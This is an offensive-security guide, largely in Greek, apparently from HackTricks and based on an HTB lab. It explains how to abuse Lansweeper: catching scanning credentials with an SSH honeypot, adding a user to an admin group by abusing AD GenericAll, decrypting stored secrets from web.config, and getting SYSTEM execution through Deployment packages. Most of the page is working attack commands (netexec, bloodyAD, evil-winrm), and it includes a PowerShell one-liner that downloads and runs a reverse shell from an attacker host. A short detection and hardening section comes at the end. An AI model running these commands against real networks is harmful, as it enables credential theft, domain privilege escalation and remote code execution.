# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper είναι μια πλατφόρμα ανίχνευσης και καταγραφής πόρων IT που συνήθως αναπτύσσεται σε Windows και ενσωματώνεται με το Active Directory. Οι credentials που έχουν ρυθμιστεί στο Lansweeper χρησιμοποιούνται από τους scanning engines του για να αυθεντικοποιηθούν σε πόρους μέσω πρωτοκόλλων όπως SSH, SMB/WMI και WinRM. Οι λανθασμένες ρυθμίσεις συχνά επιτρέπουν:

- Υποκλοπή credentials με την ανακατεύθυνση ενός scanning target σε έναν host ελεγχόμενο από επιτιθέμενο (honeypot)
- Κατάχρηση των AD ACLs που εκτίθενται από ομάδες σχετιζόμενες με Lansweeper για απόκτηση απομακρυσμένης πρόσβασης
- Αποκρυπτογράφηση επί του host των Lansweeper-configured secrets (connection strings και stored scanning credentials)
- Εκτέλεση κώδικα σε διαχειριζόμενα endpoints μέσω του Deployment feature (συχνά εκτελούμενου ως SYSTEM)

Αυτή η σελίδα συνοψίζει πρακτικές ροές εργασίας επιτιθέμενων και εντολές για την κατάχρηση αυτών των συμπεριφορών κατά τη διάρκεια engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Ιδέα: δημιουργήστε ένα Scanning Target που δείχνει στο host σας και αντιστοιχίστε υπάρχουσες Scanning Credentials σε αυτό. Όταν τρέξει το scan, το Lansweeper θα προσπαθήσει να αυθεντικοποιηθεί με αυτά τα credentials, και το honeypot σας θα τα καταγράψει.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Επαλήθευση των captured creds έναντι των υπηρεσιών DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Λειτουργεί παρόμοια και για άλλα πρωτόκολλα όταν μπορείτε να εξαναγκάσετε τον scanner στο listener σας (SMB/WinRM honeypots, κ.λπ.). Το SSH είναι συχνά το πιο απλό.
- Πολλοί scanners αυτοπροσδιορίζονται με διακριτά client banners (π.χ. RebexSSH) και θα επιχειρήσουν benign commands (uname, whoami, κ.λπ.).

## 2) AD ACL abuse: αποκτήστε απομακρυσμένη πρόσβαση προσθέτοντας τον εαυτό σας σε μια app-admin ομάδα

Χρησιμοποιήστε BloodHound για να απαριθμήσετε τα effective rights από τον συμβιβασμένο λογαριασμό. Ένα συνηθισμένο εύρημα είναι μια ομάδα ειδική για scanner ή εφαρμογή (π.χ. “Lansweeper Discovery”) που κατέχει GenericAll πάνω σε μια προνομιούχα ομάδα (π.χ. “Lansweeper Admins”). Εάν η προνομιούχα ομάδα είναι επίσης μέλος των “Remote Management Users”, το WinRM γίνεται διαθέσιμο μόλις προσθέσουμε τον εαυτό μας.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll σε ομάδα με BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Στη συνέχεια πάρε ένα interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Συμβουλή: Οι λειτουργίες Kerberos είναι ευαίσθητες στο χρόνο. Αν αντιμετωπίσετε το KRB_AP_ERR_SKEW, συγχρονιστείτε πρώτα με τον DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Αποκρυπτογραφήστε μυστικά που ρυθμίστηκαν από Lansweeper στον host

Στον server του Lansweeper, η ASP.NET site συνήθως αποθηκεύει μια κρυπτογραφημένη connection string και ένα συμμετρικό κλειδί που χρησιμοποιείται από την εφαρμογή. Με κατάλληλη τοπική πρόσβαση, μπορείτε να αποκρυπτογραφήσετε το DB connection string και στη συνέχεια να εξάγετε τα αποθηκευμένα διαπιστευτήρια σάρωσης.

Τυπικές τοποθεσίες:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Κλειδί εφαρμογής: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Χρησιμοποιήστε το SharpLansweeperDecrypt για να αυτοματοποιήσετε την αποκρυπτογράφηση και την εξαγωγή των αποθηκευμένων διαπιστευτηρίων:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Το αναμενόμενο αποτέλεσμα περιλαμβάνει λεπτομέρειες σύνδεσης στη βάση δεδομένων και διαπιστευτήρια σάρωσης σε απλό κείμενο, όπως λογαριασμοί Windows και Linux που χρησιμοποιούνται σε ολόκληρη την υποδομή. Αυτά συχνά έχουν αυξημένα τοπικά δικαιώματα σε domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Χρησιμοποιήστε τα ανακτημένα Windows scanning creds για προνομιακή πρόσβαση:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Ως μέλος των “Lansweeper Admins”, το web UI εμφανίζει τις επιλογές Deployment και Configuration. Στην καρτέλα Deployment → Deployment packages, μπορείτε να δημιουργήσετε packages που εκτελούν αυθαίρετες εντολές σε στοχευμένα assets. Η εκτέλεση γίνεται από την υπηρεσία Lansweeper με υψηλά προνόμια, παρέχοντας εκτέλεση κώδικα ως NT AUTHORITY\SYSTEM στον επιλεγμένο host.

High-level steps:
- Δημιουργήστε ένα νέο Deployment package που εκτελεί ένα PowerShell ή cmd εντολή μιας γραμμής (reverse shell, add-user, κ.λπ.).
- Στοχεύστε το επιθυμητό asset (π.χ. τον DC/host όπου τρέχει το Lansweeper) και κάντε κλικ στο Deploy/Run now.
- Πιάστε το shell σας ως SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Οι ενέργειες Deployment είναι θορυβώδεις και αφήνουν logs στο Lansweeper και στα Windows event logs. Χρησιμοποιήστε με φειδώ.

## Ανίχνευση και ενίσχυση ασφάλειας

- Περιορίστε ή καταργήστε την ανώνυμη απαρίθμηση SMB. Παρακολουθήστε για RID cycling και ασυνήθιστη πρόσβαση σε κοινόχρηστους πόρους του Lansweeper.
- Έλεγχος εξερχόμενης κυκλοφορίας: μπλοκάρετε ή περιορίστε αυστηρά την εξερχόμενη κίνηση SSH/SMB/WinRM από hosts σαρωτών. Ειδοποιήστε για μη τυπικές θύρες (π.χ., 2022) και ασυνήθιστα client banners όπως το Rebex.
- Προστατέψτε `Website\\web.config` και `Key\\Encryption.txt`. Εξωτερικοποιήστε τα secrets σε vault και κάνετε rotation σε περίπτωση έκθεσης. Εξετάστε service accounts με ελάχιστα προνόμια και gMSA όπου είναι εφικτό.
- Παρακολούθηση AD: ειδοποιήστε για αλλαγές σε ομάδες σχετικές με Lansweeper (π.χ., “Lansweeper Admins”, “Remote Management Users”) και για αλλαγές ACL που παραχωρούν GenericAll/Write δικαιώματα μέλους σε προνομιακές ομάδες.
- Επιθεωρήστε τη δημιουργία/αλλαγές/εκτέλεση Deployment packages· ειδοποιήστε αν πακέτα εκκινούν cmd.exe/powershell.exe ή δημιουργούν απροσδόκητες εξερχόμενες συνδέσεις.

## Σχετικά θέματα
- SMB/LSA/SAMR απαρίθμηση και RID cycling
- Kerberos password spraying και ζητήματα clock skew
- BloodHound ανάλυση διαδρομών για application-admin groups
- WinRM χρήση και lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
